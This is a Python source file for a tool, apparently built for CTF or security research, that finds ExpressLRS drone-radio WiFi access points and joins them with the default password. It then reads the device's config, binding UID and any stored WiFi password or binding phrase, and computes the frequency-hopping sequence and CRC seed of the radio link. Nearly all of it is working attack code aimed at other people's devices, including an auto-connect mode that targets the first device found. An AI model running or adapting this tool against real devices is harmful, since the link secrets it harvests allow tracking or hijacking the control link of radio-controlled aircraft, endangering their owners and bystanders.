#!/usr/bin/env python3
"""
ELRS WiFi Configuration Extractor

When an ELRS TX or RX enters WiFi update mode, it runs an ESP32/ESP8266
WiFi AP with a web interface. This tool discovers those APs, connects,
and extracts security-relevant configuration — including the UID bytes
that seed the FHSS hopping sequence and CRC initializer.

Source-verified endpoints (ExpressLRS 4.1.0, src/lib/WIFI/devWIFI.cpp):
    GET /config          → full config JSON (uid, version, radio, domain)
    GET /options.json     → firmware build options
    GET /hardware.json    → hardware pin mapping
    GET /networks.json    → scanned WiFi networks

Default AP credentials (src/lib/OPTIONS/options.cpp):
    TX SSID:    "ExpressLRS TX"    RX SSID:    "ExpressLRS RX"
    Password:   "expresslrs"       AP IP:      10.0.0.1
    Hostname:   elrs_tx / elrs_rx  (mDNS: elrs_tx.local / elrs_rx.local)

This tool is READ-ONLY. It never POSTs to /config, /options.json,
/update, /reset, /reboot, or any write endpoint.

Usage:
    # Scan for ELRS WiFi APs (no connection)
    python3 elrs-wifi-extract.py --scan

    # Extract config from a known ELRS AP IP (already connected)
    python3 elrs-wifi-extract.py --target 10.0.0.1

    # Extract config via mDNS hostname
    python3 elrs-wifi-extract.py --target elrs_tx.local

    # Connect to an ELRS AP by SSID, extract config
    python3 elrs-wifi-extract.py --ssid "ExpressLRS TX"

    # Use the built-in default (connect to first ELRS AP found)
    python3 elrs-wifi-extract.py --auto

    # Output JSON to file
    python3 elrs-wifi-extract.py --target 10.0.0.1 -o extracted.json

    # Derive FHSS/CRC from extracted UID (offline, no network)
    python3 elrs-wifi-extract.py --uid 0xAA,0xBB,0xCC,0xDD,0xEE,0xFF

Requires: Python 3.10+, requests (or urllib fallback).
For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import re
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from pathlib import Path

log = logging.getLogger("elrs-wifi-extract")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    stream=sys.stderr,
)

# ---------------------------------------------------------------------------
# ELRS protocol constants (mirroring tools/elrs_core/)
# ---------------------------------------------------------------------------

ELRS_DEFAULT_AP_IP = "10.0.0.1"
ELRS_DEFAULT_AP_PASSWORD = "expresslrs"
ELRS_KNOWN_SSIDS = [
    "ExpressLRS TX",
    "ExpressLRS RX",
]
ELRS_SSID_PATTERNS = [
    re.compile(r"ExpressLRS", re.IGNORECASE),
    re.compile(r"ELRS", re.IGNORECASE),
]

# Read-only endpoints per devWIFI.cpp
ENDPOINT_CONFIG = "/config"
ENDPOINT_OPTIONS = "/options.json"
ENDPOINT_HARDWARE = "/hardware.json"

OTA_VERSION_IDS = {3: "ELRS v3.x", 4: "ELRS v4.x"}
DEFAULT_OTA_VERSION = 4

# FHSS domain table (matching tools/elrs_core/fhss.py)
FHSS_DOMAINS = {
    "ISM2G4":  {"start": 2400400000, "stop": 2479400000, "count": 80},
    "CE_LBT":  {"start": 2400400000, "stop": 2479400000, "count": 80},
    "FCC915":  {"start": 903500000,  "stop": 926900000,  "count": 40},
    "AU915":   {"start": 915500000,  "stop": 926900000,  "count": 20},
    "EU868":   {"start": 863275000,  "stop": 869575000,  "count": 13},
    "IN866":   {"start": 865375000,  "stop": 866950000,  "count": 4},
    "AU433":   {"start": 433420000,  "stop": 434420000,  "count": 3},
    "EU433":   {"start": 433100000,  "stop": 434450000,  "count": 3},
    "US433":   {"start": 433250000,  "stop": 438000000,  "count": 8},
}


# ---------------------------------------------------------------------------
# ELRS crypto derivation (standalone, no import dependency)
# ---------------------------------------------------------------------------

def uid_from_binding_phrase(phrase: str) -> bytes:
    """MD5('-DMY_BINDING_PHRASE="<phrase>"')[0:6] → UID."""
    token = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(token.encode("utf-8")).digest()[:6]


def uid_seed(uid: bytes, ota_version: int = DEFAULT_OTA_VERSION) -> int:
    """(UID[2]<<24)|(UID[3]<<16)|(UID[4]<<8)|(UID[5]^OTA_VERSION_ID)."""
    return ((uid[2] << 24) | (uid[3] << 16) |
            (uid[4] << 8) | (uid[5] ^ ota_version))


def crc_init(uid: bytes, ota_version: int = DEFAULT_OTA_VERSION) -> int:
    """((UID[4]<<8)|UID[5]) ^ (OTA_VERSION_ID<<8)."""
    return (((uid[4] << 8) | uid[5]) ^ (ota_version << 8)) & 0xFFFF


class _Lcg:
    """ELRS 31-bit LCG for FHSS sequence generation."""
    __slots__ = ("seed",)

    def __init__(self, seed: int):
        self.seed = seed & 0x7FFFFFFF

    def rng(self) -> int:
        self.seed = (214013 * self.seed + 2531011) % 2147483648
        return self.seed >> 16

    def rng_n(self, upper: int) -> int:
        return self.rng() % upper


def build_fhss_sequence(seed: int, freq_count: int,
                        sync_channel: int) -> list[int]:
    """Build the ELRS FHSS hop sequence from seed."""
    seq_len = (256 // freq_count) * freq_count
    seq = []
    for i in range(seq_len):
        if i % freq_count == 0:
            seq.append(sync_channel)
        elif i % freq_count == sync_channel:
            seq.append(0)
        else:
            seq.append(i % freq_count)
    lcg = _Lcg(seed)
    for i in range(seq_len):
        if i % freq_count != 0:
            offset = (i // freq_count) * freq_count
            rand = lcg.rng_n(freq_count - 1) + 1
            seq[i], seq[offset + rand] = seq[offset + rand], seq[i]
    return seq


def derive_link_parameters(uid: bytes,
                           ota_version: int = DEFAULT_OTA_VERSION,
                           domain: str = "ISM2G4") -> dict:
    """Derive all FHSS/CRC parameters from a 6-byte UID."""
    seed = uid_seed(uid, ota_version)
    ci = crc_init(uid, ota_version)

    dom = FHSS_DOMAINS.get(domain, FHSS_DOMAINS["ISM2G4"])
    freq_count = dom["count"]

    # Both sync-channel formulas (version-dependent)
    sync_v3 = freq_count // 2 + 1  # ELRS <= 3.x
    sync_v4 = freq_count // 2      # ELRS master / 4.x

    sync_ch = sync_v3 if ota_version <= 3 else sync_v4

    sequence = build_fhss_sequence(seed, freq_count, sync_ch)

    # Convert sequence indices to frequencies
    spread = (dom["stop"] - dom["start"]) / max(freq_count - 1, 1)
    freq_table = [int(round(dom["start"] + spread * idx)) for idx in range(freq_count)]
    hop_freqs = [freq_table[ch] for ch in sequence]

    return {
        "uid_hex": uid.hex(),
        "uid_bytes": list(uid),
        "ota_version": ota_version,
        "fhss_seed": seed,
        "crc_init": ci,
        "crc_init_hex": f"0x{ci:04X}",
        "domain": domain,
        "freq_count": freq_count,
        "sync_channel": sync_ch,
        "sequence_length": len(sequence),
        "fhss_sequence": sequence,
        "hop_frequencies_mhz": [f / 1e6 for f in hop_freqs[:20]],
    }


# ---------------------------------------------------------------------------
# WiFi scanning (Linux nmcli / iw)
# ---------------------------------------------------------------------------

def scan_wifi_networks() -> list[dict]:
    """Scan for nearby WiFi networks, return SSID + signal info."""
    networks = []

    # Try nmcli first
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY,BSSID", "dev", "wifi", "list", "--rescan", "yes"],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                if not line.strip():
                    continue
                parts = line.split(":")
                if len(parts) >= 4:
                    ssid = parts[0].strip()
                    if ssid:
                        networks.append({
                            "ssid": ssid,
                            "signal": parts[1].strip(),
                            "security": parts[2].strip(),
                            "bssid": ":".join(parts[3:]).strip(),
                        })
            if networks:
                return networks
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Fallback: iw scan
    try:
        result = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, timeout=10,
        )
        iface = None
        if result.returncode == 0:
            for line in result.stdout.split("\n"):
                if "Interface" in line:
                    iface = line.split()[-1]
                    break
        if iface:
            result = subprocess.run(
                ["sudo", "iw", iface, "scan"],
                capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                current = {}
                for line in result.stdout.split("\n"):
                    line = line.strip()
                    if line.startswith("BSS "):
                        if current.get("ssid"):
                            networks.append(current)
                        bssid = line.split()[1].rstrip("(")
                        current = {"bssid": bssid, "ssid": "", "signal": "", "security": ""}
                    elif line.startswith("SSID:"):
                        current["ssid"] = line[5:].strip()
                    elif line.startswith("signal:"):
                        current["signal"] = line[7:].strip()
                if current.get("ssid"):
                    networks.append(current)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return networks


def find_elrs_networks(networks: list[dict]) -> list[dict]:
    """Filter networks that match known ELRS SSID patterns."""
    matches = []
    for net in networks:
        ssid = net.get("ssid", "")
        if ssid in ELRS_KNOWN_SSIDS:
            net["match"] = "exact"
            matches.append(net)
        elif any(p.search(ssid) for p in ELRS_SSID_PATTERNS):
            net["match"] = "pattern"
            matches.append(net)
    return matches


# ---------------------------------------------------------------------------
# WiFi connection (Linux nmcli)
# ---------------------------------------------------------------------------

def connect_to_ap(ssid: str, password: str = ELRS_DEFAULT_AP_PASSWORD,
                  timeout_s: int = 30) -> bool:
    """Connect to an ELRS WiFi AP using nmcli."""
    log.info("Connecting to WiFi AP: %s", ssid)
    try:
        # Delete any old connection profile for this SSID
        subprocess.run(
            ["nmcli", "connection", "delete", ssid],
            capture_output=True, timeout=10,
        )
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "password", password],
            capture_output=True, text=True, timeout=timeout_s,
        )
        if result.returncode == 0:
            log.info("Connected to %s", ssid)
            time.sleep(2)  # wait for DHCP
            return True
        else:
            log.error("nmcli connect failed: %s", result.stderr.strip())
            return False
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        log.error("WiFi connection error: %s", e)
        return False


# ---------------------------------------------------------------------------
# HTTP extraction (stdlib urllib — no external deps required)
# ---------------------------------------------------------------------------

def _http_get(url: str, timeout: int = 10) -> bytes | None:
    """GET request with error handling. Returns response body or None."""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except (urllib.error.URLError, urllib.error.HTTPError, socket.timeout,
            ConnectionError, OSError) as e:
        log.warning("HTTP GET %s failed: %s", url, e)
        return None


def _try_requests_get(url: str, timeout: int = 10) -> bytes | None:
    """Try using requests library if available (handles redirects better)."""
    try:
        import requests
        resp = requests.get(url, timeout=timeout, allow_redirects=True)
        resp.raise_for_status()
        return resp.content
    except ImportError:
        return _http_get(url, timeout)
    except Exception as e:
        log.warning("requests GET %s failed: %s", url, e)
        return _http_get(url, timeout)


@dataclass
class ElrsConfig:
    """Parsed ELRS device configuration."""
    raw_config: dict = field(default_factory=dict)
    raw_options: dict = field(default_factory=dict)
    raw_hardware: dict = field(default_factory=dict)

    # Extracted fields
    uid: bytes = b""
    uid_type: str = ""
    version: str = ""
    product_name: str = ""
    device_name: str = ""
    target: str = ""
    module_type: str = ""  # "TX" or "RX"
    radio_type: str = ""   # "SX128X", "SX127X", "LR1121"
    reg_domain: str = ""
    wifi_mode: str = ""
    git_commit: str = ""


def extract_config(host: str, port: int = 80) -> ElrsConfig | None:
    """Extract configuration from an ELRS device's WiFi web interface."""
    base = f"http://{host}:{port}" if port != 80 else f"http://{host}"
    cfg = ElrsConfig()

    # 1. GET /config — the main prize
    log.info("Querying %s%s", base, ENDPOINT_CONFIG)
    data = _try_requests_get(f"{base}{ENDPOINT_CONFIG}")
    if data is None:
        log.error("Failed to reach %s — is the device in WiFi mode?", base)
        return None

    try:
        cfg.raw_config = json.loads(data)
    except json.JSONDecodeError as e:
        log.error("Invalid JSON from /config: %s", e)
        return None

    # Extract UID from config.uid array
    config_section = cfg.raw_config.get("config", {})
    uid_array = config_section.get("uid", [])
    if uid_array and len(uid_array) == 6:
        cfg.uid = bytes(uid_array)
        log.info("UID extracted: %s", cfg.uid.hex())
    else:
        log.warning("No UID in /config response (uid=%r)", uid_array)

    # Extract settings
    settings = cfg.raw_config.get("settings", {})
    cfg.uid_type = settings.get("uidtype", "")
    cfg.version = settings.get("version", "")
    cfg.product_name = settings.get("product_name", "")
    cfg.device_name = settings.get("lua_name", "")
    cfg.target = settings.get("target", "")
    cfg.module_type = settings.get("module-type", "")
    cfg.radio_type = settings.get("radio-type", "")
    cfg.wifi_mode = settings.get("mode", "")
    cfg.git_commit = settings.get("git-commit", "")

    # Regulatory domain
    if settings.get("has_high_band"):
        cfg.reg_domain = settings.get("reg_domain_high", "ISM2G4")
    elif settings.get("has_low_band"):
        cfg.reg_domain = settings.get("reg_domain_low", "")

    # 2. GET /options.json — build options (binding phrase hash, etc.)
    log.info("Querying %s%s", base, ENDPOINT_OPTIONS)
    data = _try_requests_get(f"{base}{ENDPOINT_OPTIONS}")
    if data:
        try:
            cfg.raw_options = json.loads(data)
        except json.JSONDecodeError:
            log.warning("Invalid JSON from /options.json")

    # 3. GET /hardware.json — pin mapping
    log.info("Querying %s%s", base, ENDPOINT_HARDWARE)
    data = _try_requests_get(f"{base}{ENDPOINT_HARDWARE}")
    if data:
        try:
            cfg.raw_hardware = json.loads(data)
        except json.JSONDecodeError:
            log.warning("Invalid JSON from /hardware.json")

    return cfg


# ---------------------------------------------------------------------------
# mDNS discovery
# ---------------------------------------------------------------------------

def discover_mdns(timeout_s: float = 5.0) -> list[dict]:
    """Discover ELRS devices via mDNS (vendor=elrs in TXT records)."""
    devices = []
    try:
        from zeroconf import ServiceBrowser, Zeroconf, ServiceStateChange

        zc = Zeroconf()
        found = []

        class Listener:
            def add_service(self, zc, stype, name):
                info = zc.get_service_info(stype, name)
                if info:
                    props = {k.decode(): v.decode() if isinstance(v, bytes) else v
                             for k, v in info.properties.items()}
                    if props.get("vendor") == "elrs":
                        addresses = [socket.inet_ntoa(a) for a in info.addresses]
                        found.append({
                            "name": name,
                            "host": addresses[0] if addresses else info.server,
                            "port": info.port,
                            "properties": props,
                        })

            def remove_service(self, zc, stype, name):
                pass

            def update_service(self, zc, stype, name):
                pass

        listener = Listener()
        ServiceBrowser(zc, "_http._tcp.local.", listener)
        time.sleep(timeout_s)
        zc.close()
        devices = found

    except ImportError:
        log.info("zeroconf not installed — trying avahi-browse fallback")
        try:
            result = subprocess.run(
                ["avahi-browse", "-ptr", "_http._tcp"],
                capture_output=True, text=True, timeout=timeout_s + 5,
            )
            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if line.startswith("=") and "elrs" in line.lower():
                        parts = line.split(";")
                        if len(parts) >= 8:
                            devices.append({
                                "name": parts[3],
                                "host": parts[7],
                                "port": int(parts[8]) if len(parts) > 8 else 80,
                            })
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    return devices


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------

def format_report(cfg: ElrsConfig,
                  ota_version: int = DEFAULT_OTA_VERSION) -> dict:
    """Build a structured JSON report from extracted config."""
    report: dict = {
        "device": {
            "product_name": cfg.product_name,
            "device_name": cfg.device_name,
            "target": cfg.target,
            "module_type": cfg.module_type,
            "radio_type": cfg.radio_type,
            "version": cfg.version,
            "git_commit": cfg.git_commit,
            "uid_type": cfg.uid_type,
            "reg_domain": cfg.reg_domain,
            "wifi_mode": cfg.wifi_mode,
        },
    }

    if cfg.uid and len(cfg.uid) == 6:
        # Check if UID is all zeros (not bound / no binding phrase)
        if cfg.uid == b"\x00" * 6:
            report["uid"] = {
                "status": "not_set",
                "note": "UID is all zeros — device has no binding phrase set, "
                        "or UID is derived from MAC address at runtime",
            }
        else:
            params = derive_link_parameters(cfg.uid, ota_version, cfg.reg_domain or "ISM2G4")
            report["uid"] = {
                "status": "extracted",
                "hex": cfg.uid.hex(),
                "bytes": list(cfg.uid),
                "sync_visible": {
                    "uid4": cfg.uid[4],
                    "uid5": cfg.uid[5],
                    "hex": f"{cfg.uid[4]:02x}:{cfg.uid[5]:02x}",
                    "note": "These 2 bytes are visible in every SYNC packet",
                },
            }
            report["derived_parameters"] = {
                "ota_version": ota_version,
                "fhss_seed": params["fhss_seed"],
                "fhss_seed_hex": f"0x{params['fhss_seed']:08X}",
                "crc_init": params["crc_init"],
                "crc_init_hex": params["crc_init_hex"],
                "domain": params["domain"],
                "freq_count": params["freq_count"],
                "sync_channel": params["sync_channel"],
                "sequence_length": params["sequence_length"],
                "fhss_sequence_first_20": params["fhss_sequence"][:20],
                "hop_frequencies_mhz_first_20": params["hop_frequencies_mhz"],
            }
    else:
        report["uid"] = {
            "status": "not_found",
            "note": "UID not present in /config response",
        }

    # Include options that reveal binding phrase hash or other secrets
    if cfg.raw_options:
        interesting_keys = [
            "uid", "binding-phrase", "flash-discriminator",
            "wifi-on-interval", "wifi-ssid", "wifi-password",
            "domain", "hasUID", "customised",
        ]
        options_extract = {}
        for k in interesting_keys:
            if k in cfg.raw_options:
                options_extract[k] = cfg.raw_options[k]
        if options_extract:
            report["options"] = options_extract

    if cfg.raw_hardware:
        report["hardware"] = cfg.raw_hardware

    return report


def print_summary(report: dict) -> None:
    """Print a human-readable summary to stderr."""
    dev = report.get("device", {})
    print(f"\n{'='*60}", file=sys.stderr)
    print("ELRS WiFi Configuration Extract", file=sys.stderr)
    print(f"{'='*60}", file=sys.stderr)

    print(f"  Product:      {dev.get('product_name', '?')}", file=sys.stderr)
    print(f"  Device:       {dev.get('device_name', '?')}", file=sys.stderr)
    print(f"  Target:       {dev.get('target', '?')}", file=sys.stderr)
    print(f"  Type:         {dev.get('module_type', '?')}", file=sys.stderr)
    print(f"  Radio:        {dev.get('radio_type', '?')}", file=sys.stderr)
    print(f"  Version:      {dev.get('version', '?')}", file=sys.stderr)
    print(f"  Git Commit:   {dev.get('git_commit', '?')}", file=sys.stderr)
    print(f"  UID Type:     {dev.get('uid_type', '?')}", file=sys.stderr)
    print(f"  Reg Domain:   {dev.get('reg_domain', '?')}", file=sys.stderr)

    uid_info = report.get("uid", {})
    status = uid_info.get("status", "unknown")
    print(f"\n  UID Status:   {status}", file=sys.stderr)

    if status == "extracted":
        print(f"  UID Hex:      {uid_info.get('hex', '?')}", file=sys.stderr)
        print(f"  UID Bytes:    {uid_info.get('bytes', '?')}", file=sys.stderr)
        sv = uid_info.get("sync_visible", {})
        print(f"  SYNC Visible: {sv.get('hex', '?')} (UID[4]:UID[5])", file=sys.stderr)

        params = report.get("derived_parameters", {})
        if params:
            print(f"\n  --- Derived Link Parameters ---", file=sys.stderr)
            print(f"  OTA Version:  {params.get('ota_version', '?')}", file=sys.stderr)
            print(f"  FHSS Seed:    {params.get('fhss_seed_hex', '?')}", file=sys.stderr)
            print(f"  CRC Init:     {params.get('crc_init_hex', '?')}", file=sys.stderr)
            print(f"  Domain:       {params.get('domain', '?')}", file=sys.stderr)
            print(f"  Freq Count:   {params.get('freq_count', '?')}", file=sys.stderr)
            print(f"  Sync Channel: {params.get('sync_channel', '?')}", file=sys.stderr)
            print(f"  Seq Length:   {params.get('sequence_length', '?')}", file=sys.stderr)
            seq = params.get("fhss_sequence_first_20", [])
            print(f"  First 20 Hops: {seq}", file=sys.stderr)

    elif status == "not_set":
        print(f"  Note:         {uid_info.get('note', '')}", file=sys.stderr)

    opts = report.get("options", {})
    if opts:
        print(f"\n  --- Firmware Options ---", file=sys.stderr)
        for k, v in opts.items():
            print(f"  {k}: {v}", file=sys.stderr)

    print(f"{'='*60}\n", file=sys.stderr)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_uid_arg(uid_str: str) -> bytes:
    """Parse a UID string like '0xAA,0xBB,...' or 'AA:BB:CC:DD:EE:FF'."""
    uid_str = uid_str.strip()
    if "," in uid_str:
        parts = [p.strip() for p in uid_str.split(",")]
        return bytes(int(p, 0) for p in parts)
    elif ":" in uid_str:
        parts = uid_str.split(":")
        return bytes(int(p, 16) for p in parts)
    else:
        return bytes.fromhex(uid_str)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="ELRS WiFi Configuration Extractor — read-only extraction "
                    "of ELRS device config via WiFi update mode web interface.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )

    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--scan", action="store_true",
                      help="Scan for ELRS WiFi APs (no connection)")
    mode.add_argument("--target", metavar="HOST",
                      help="Extract from a known host/IP (e.g. 10.0.0.1, elrs_tx.local)")
    mode.add_argument("--ssid", metavar="SSID",
                      help="Connect to a specific SSID, then extract")
    mode.add_argument("--auto", action="store_true",
                      help="Scan, connect to first ELRS AP found, extract")
    mode.add_argument("--mdns", action="store_true",
                      help="Discover ELRS devices via mDNS")
    mode.add_argument("--uid", metavar="UID",
                      help="Offline: derive FHSS/CRC from a UID "
                           "(e.g. 0xAA,0xBB,0xCC,0xDD,0xEE,0xFF or AA:BB:CC:DD:EE:FF)")

    parser.add_argument("--password", default=ELRS_DEFAULT_AP_PASSWORD,
                        help="WiFi AP password (default: expresslrs)")
    parser.add_argument("--port", type=int, default=80,
                        help="Web interface port (default: 80)")
    parser.add_argument("--ota-version", type=int, default=DEFAULT_OTA_VERSION,
                        choices=[3, 4],
                        help="OTA version for FHSS/CRC derivation (default: 4)")
    parser.add_argument("--domain", default="",
                        help="Regulatory domain override (e.g. ISM2G4, FCC915)")
    parser.add_argument("-o", "--output", metavar="FILE",
                        help="Write JSON output to file (default: stdout)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose logging")
    parser.add_argument("--raw", action="store_true",
                        help="Include raw /config, /options.json, /hardware.json in output")

    args = parser.parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    # --- Mode: Offline UID derivation ---
    if args.uid:
        uid = parse_uid_arg(args.uid)
        if len(uid) != 6:
            log.error("UID must be exactly 6 bytes, got %d", len(uid))
            return 1
        domain = args.domain or "ISM2G4"
        params = derive_link_parameters(uid, args.ota_version, domain)
        output = json.dumps(params, indent=2)
        if args.output:
            Path(args.output).write_text(output + "\n")
            log.info("Written to %s", args.output)
        else:
            print(output)
        return 0

    # --- Mode: Scan ---
    if args.scan:
        log.info("Scanning for WiFi networks...")
        networks = scan_wifi_networks()
        if not networks:
            log.warning("No WiFi networks found (need root/nmcli?)")
            return 1

        elrs_nets = find_elrs_networks(networks)
        result = {
            "total_networks": len(networks),
            "elrs_matches": elrs_nets,
            "all_networks": networks,
        }
        output = json.dumps(result, indent=2)
        if args.output:
            Path(args.output).write_text(output + "\n")
        else:
            print(output)

        if elrs_nets:
            log.info("Found %d ELRS network(s):", len(elrs_nets))
            for n in elrs_nets:
                log.info("  SSID: %-25s Signal: %s  Match: %s",
                         n["ssid"], n.get("signal", "?"), n.get("match", "?"))
        else:
            log.info("No ELRS networks found among %d visible networks", len(networks))
        return 0

    # --- Mode: mDNS discovery ---
    if args.mdns:
        log.info("Discovering ELRS devices via mDNS...")
        devices = discover_mdns()
        output = json.dumps(devices, indent=2)
        if args.output:
            Path(args.output).write_text(output + "\n")
        else:
            print(output)
        if devices:
            log.info("Found %d ELRS device(s):", len(devices))
            for d in devices:
                log.info("  %s @ %s:%s", d.get("name", "?"),
                         d.get("host", "?"), d.get("port", 80))
        else:
            log.info("No ELRS devices found via mDNS")
        return 0

    # --- Mode: Auto (scan + connect + extract) ---
    if args.auto:
        log.info("Auto mode: scanning for ELRS WiFi APs...")
        networks = scan_wifi_networks()
        elrs_nets = find_elrs_networks(networks)
        if not elrs_nets:
            log.error("No ELRS WiFi APs found")
            return 1
        ssid = elrs_nets[0]["ssid"]
        log.info("Found ELRS AP: %s — connecting...", ssid)
        if not connect_to_ap(ssid, args.password):
            log.error("Failed to connect to %s", ssid)
            return 1
        args.target = ELRS_DEFAULT_AP_IP

    # --- Mode: Connect to SSID ---
    if args.ssid:
        if not connect_to_ap(args.ssid, args.password):
            log.error("Failed to connect to %s", args.ssid)
            return 1
        args.target = ELRS_DEFAULT_AP_IP

    # --- Mode: Extract from target ---
    if not args.target:
        parser.print_help()
        return 1

    log.info("Extracting config from %s...", args.target)
    cfg = extract_config(args.target, args.port)
    if cfg is None:
        return 1

    # Override domain if specified
    if args.domain:
        cfg.reg_domain = args.domain

    report = format_report(cfg, args.ota_version)

    if args.raw:
        report["raw_config"] = cfg.raw_config
        report["raw_options"] = cfg.raw_options
        report["raw_hardware"] = cfg.raw_hardware

    print_summary(report)

    output = json.dumps(report, indent=2)
    if args.output:
        Path(args.output).write_text(output + "\n")
        log.info("JSON output written to %s", args.output)
    else:
        print(output)

    return 0


if __name__ == "__main__":
    sys.exit(main())
